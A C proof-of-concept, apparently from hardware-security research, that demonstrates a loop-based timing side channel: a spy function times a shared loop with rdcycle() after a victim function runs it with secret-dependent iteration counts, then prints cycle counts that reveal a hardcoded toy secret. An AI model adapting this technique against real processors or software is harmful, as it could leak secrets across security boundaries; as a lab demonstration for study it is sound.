/*/////////////////////////////////////////////////////////////////////////////////
 * Name: Predictive Loop Attack
 * Author: Rutvik Chavda
 * Description: This code demonstrates the Loop attack, where a  spy function
 *              infers secret data by measuring loop execution time. The victim
 *              and spy functions use a loop whose iteration count depends on
 *              secret data and a known dummy value, respectively. Matching inputs
 *              cause the spy function to execute faster, revealing the secret data.
 * License: GPL v3 - https://www.gnu.org/licenses/gpl-3.0.html
 /////////////////////////////////////////////////////////////////////////////////*/

#include <stdio.h>
#include <stdint.h>
#include "encoding.h" // Include for `rdcycle()` function

#define K 10
#define J 10
#define SECRET_DATA_SIZE 8

unsigned int diff_values[K][SECRET_DATA_SIZE] = {};
unsigned int start, diff;

void loopFunc(unsigned int addr) {
    for (unsigned int i = 0; i < addr + 2; i++) {
        __asm__ __volatile__("nop\n"
                             "nop\n");
    }
}

void victimFunc(unsigned int idx) {
    unsigned int secret_data[SECRET_DATA_SIZE] = {1, 0, 0, 1, 1, 0, 1, 0}; // Secret data
    loopFunc(secret_data[idx]);
}

void spyFunc(unsigned int idx, int k, int i) {
    unsigned int array1[1] = {1}; // Dummy array for timing
    start = rdcycle();
    loopFunc(array1[idx]);
    diff = rdcycle() - start;
    diff_values[k][i] = diff;
}

int main(void) {
    // Train the victim function
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        for (int k = 0; k < K; k++) {
            for (int j = 0; j < J; j++) {
                victimFunc(i);
            }
            // Spy function attempts to measure timing and infer secret data
            spyFunc(0, k, i);
        }
    }

    // Analyzing the gathered timing data
    printf("\nLower cycle count values coincide with the dummy value (1) in the spy array.\n");
    for (int i = 0; i < SECRET_DATA_SIZE; i++) {
        printf("Index: %d, Cycle count: ", i+1);
        for (int k = 0; k < K; k++) {
            // Filter out abnormally high values due to background kernel tasks
            if (diff_values[k][i] < 200) {
                printf("%u ", diff_values[k][i]);
            }
        }
        printf("\n");
    }
    return 0;
}
